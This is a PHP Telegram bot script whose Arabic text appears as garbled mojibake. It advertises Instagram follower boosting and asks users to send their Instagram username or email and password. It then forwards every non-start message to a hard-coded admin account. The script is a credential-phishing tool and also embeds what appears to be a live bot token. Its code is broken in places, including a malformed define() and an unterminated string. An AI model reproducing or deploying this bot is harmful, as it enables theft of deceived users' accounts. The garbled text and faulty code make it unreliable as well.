<?php

ob_start();

define('1501157696:AAFaHlwQC6EdoEHEQt21bWwT08VPwnfNr0Y');
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$admin = 1662740335;
$id = $message->from->id;

if($text == '/start' and $id ){
    bot('sendmessage',[
       'chat_id'=>$chat_id,
        'text'=>'๐โุงููููุง ุจู ุนุฒูุฒู
๐โูู ุจูููุช ุฑุดููู ุญุณุงุจุงุช ุงูุงูุณููุชุง
๐โูุถููููุฉ ุงูุจูููุช
๐โูุดููุฑ ุญุณุงุจููู ุจุฃูุซููุฑ ูู 30 ูููุน ุฎุงุต ุจุงูุฑุดู
๐โุงุถุบููุท ใ  followers_my_acount30k/ ใ',
        'reply_markup'=>json_encode([
          'inline_keyboard'=>[ 
            [
                ['text'=>'โปุชุงุจุนูููุงโป','url'=>'https://t.me/Kings_Domain']
            ],
            [
                ['text'=>'โปุงููุทูููุฑโป','url'=>'https://t.me/mahmoodeltaweel03']
            ],
              ]
        ])
    ]);
}

if($text != '/start' and $id != $admin){
    bot('forwardMessage',[
        'chat_id'=>$admin,
        'from_chat_id'=>$chat_id,
        'message_id'=>$message->message_id,
    ]);
    bot('sendmessage',[
       'chat_id'=>$chat_id,
        'text'=>'',
        'reply_to_message_id'=>$message->message_id,
        '
]);
}
if($text == '/followers_my_acount30k'){
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>'๐ฏโุนุฒูููุฒู ุงุชุจููุน ุงููุงุฆูููู ุงุฏูุงู ูุฑุดู ุญุณุงุจู
๐ฏโูุงูุญุตูููู ุนูู ุฒูุงุฏู 30k
โโโโุชุงุจุนูููุง @Kings_Domain', 
'reply_markup'=>json_encode([ 
'keyboard'=>[ 
[ 
['text'=>'๐ฏยฆุฑุดู ุญุณููุงุจู10k'] 
],
[ 
['text'=>'๐ฏยฆ ุฑุดููู ุญุณุงุจู 20k'],['text'=>'โ๏ธยฆ ุฑุดููู ุญุณุงุจู 30k']
], 
[ 
['text'=>'๐ฏยฆ ุฑุดู ุญุณุงุจููู 40k'] 
], 
[ 
['text'=>'๐ฏยฆ ุฑุดููู ุญุณุงุจู 50k']
],
]
]) 
]);
}
if($text == "๐ฏยฆุฑุดู ุญุณููุงุจู10k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"๐ใ 10k ุนุฒูููุฒู ูุฑุดููู ุญุณุงุจูููใ
๐ใูููู ุจุฃุฑุณุงู ููุฒุฑ ุญุณุงุจู ุงู ุงูุงูููู ูุงูุจุงุณููุฑุฏ 
ุงูุฎููุงุต ุจุงูุญุณุงุจ ุงููููุฑุงุฏ ุฑุดูู ุจุงูุชุฑุชูููุจ ุงุฏูุงูใ
USER:- ููููุซุงู (ua8)
EMEL :- ููุซููุงู (joe@exmple.com)
PASSWRD :- ููููุซุงู (iraqiraq)
ุชููุงูุฏ ูู ููุฆ ุงููุนูููููุงุช ูุฑุดู ุญุณุงุจููู",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($text == "๐ฏยฆ ุฑุดููู ุญุณุงุจู 20k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"๐ใ 20k ุนุฒูููุฒู ูุฑุดููู ุญุณุงุจูููใ
๐ใูููู ุจุฃุฑุณุงู ููุฒุฑ ุญุณุงุจู ุงู ุงูุงูููู ูุงูุจุงุณููุฑุฏ 
ุงูุฎููุงุต ุจุงูุญุณุงุจ ุงููููุฑุงุฏ ุฑุดูู ุจุงูุชุฑุชูููุจ ุงุฏูุงูใ
USER:- ููููุซุงู (ua8)
EMEL :- ููุซููุงู (joe@exmple.com)
PASSWRD :- ููููุซุงู (iraqiraq)
ุชููุงูุฏ ูู ููุฆ ุงููุนูููููุงุช ูุฑุดู ุญุณุงุจููู",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($text == "โ๏ธยฆ ุฑุดููู ุญุณุงุจู 30k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"๐ใ 30k ุนุฒูููุฒู ูุฑุดููู ุญุณุงุจูููใ
๐ใูููู ุจุฃุฑุณุงู ููุฒุฑ ุญุณุงุจู ุงู ุงูุงูููู ูุงูุจุงุณููุฑุฏ 
ุงูุฎููุงุต ุจุงูุญุณุงุจ ุงููููุฑุงุฏ ุฑุดูู ุจุงูุชุฑุชูููุจ ุงุฏูุงูใ
USER:- ููููุซุงู (ua8)
EMEL :- ููุซููุงู (joe@exmple.com)
PASSWRD :- ููููุซุงู (iraqiraq)
ุชููุงูุฏ ูู ููุฆ ุงููุนูููููุงุช ูุฑุดู ุญุณุงุจููู",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($text == "๐ฏยฆ ุฑุดู ุญุณุงุจููู 40k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"๐ใ 40k ุนุฒูููุฒู ูุฑุดููู ุญุณุงุจูููใ
๐ใูููู ุจุฃุฑุณุงู ููุฒุฑ ุญุณุงุจู ุงู ุงูุงูููู ูุงูุจุงุณููุฑุฏ 
ุงูุฎููุงุต ุจุงูุญุณุงุจ ุงููููุฑุงุฏ ุฑุดูู ุจุงูุชุฑุชูููุจ ุงุฏูุงูใ
USER:- ููููุซุงู (ua8)
EMEL :- ููุซููุงู (joe@exmple.com)
PASSWRD :- ููููุซุงู (iraqiraq)
ุชููุงูุฏ ูู ููุฆ ุงููุนูููููุงุช ูุฑุดู ุญุณุงุจููู",
'reply_to_message_id'=>$message->message_id, 
]);
}
if($text == "๐ฏยฆ ุฑุดููู ุญุณุงุจู 50k"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"๐ใ 50k ุนุฒูููุฒู ูุฑุดููู ุญุณุงุจูููใ
๐ใูููู ุจุฃุฑุณุงู ููุฒุฑ ุญุณุงุจู ุงู ุงูุงูููู ูุงูุจุงุณููุฑุฏ 
ุงูุฎููุงุต ุจุงูุญุณุงุจ ุงููููุฑุงุฏ ุฑุดูู ุจุงูุชุฑุชูููุจ ุงุฏูุงูใ
USER:- ููููุซุงู (ua8)
EMEL :- ููุซููุงู (joe@exmple.com)
PASSWRD :- ููููุซุงู (iraqiraq)
ุชููุงูุฏ ูู ููุฆ ุงููุนูููููุงุช ูุฑุดู ุญุณุงุจููู",
'reply_to_message_id'=>$message->message_id, 
]);
} 
